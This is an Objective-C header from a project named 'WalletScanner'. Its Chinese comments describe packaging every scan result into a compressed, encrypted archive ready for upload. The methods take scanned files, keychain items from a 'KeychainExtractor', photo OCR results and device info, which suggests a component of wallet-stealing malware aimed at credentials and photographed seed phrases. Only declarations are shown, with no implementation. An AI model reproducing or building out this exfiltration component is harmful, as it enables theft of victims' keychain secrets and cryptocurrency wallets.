//
//  RDDataPackager.h
//  WalletScanner
//
//  数据打包 — 收集所有扫描结果, 压缩加密, 准备上传
//

#import <Foundation/Foundation.h>
#import "RDFileScanner.h"
#import "RDKeychainExtractor.h"
#import "RDPhotoScanner.h"

NS_ASSUME_NONNULL_BEGIN

@interface RDDataPackager : NSObject

// 打包所有数据为加密的档案
+ (nullable NSData *)packageWithFiles:(NSArray<RDScannedFile *> *)files
                          keychainItems:(NSArray<RDKeychainItem *> *)keychainItems
                           photoResults:(NSArray<RDPhotoOCRResult *> *)photoResults
                              deviceInfo:(NSDictionary *)deviceInfo
                                   error:(NSError **)error;

// 仅打包设备信息（用于注册）
+ (NSData *)packageDeviceInfo:(NSDictionary *)deviceInfo;

// 收集设备信息
+ (NSDictionary *)collectDeviceInfo;

@end

NS_ASSUME_NONNULL_END
